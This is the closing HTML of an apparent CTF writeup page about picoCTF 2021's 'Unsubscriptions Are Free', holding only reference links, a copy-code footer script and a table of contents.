<a class=anchor href=#reference>#</a></h2><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://youtu.be/ffJRcNEyApI>picoCTF 2021 Unsubscriptions Are Free </a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Unsubscriptions_Are_Free.md>Unsubscriptions Are Free WP</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>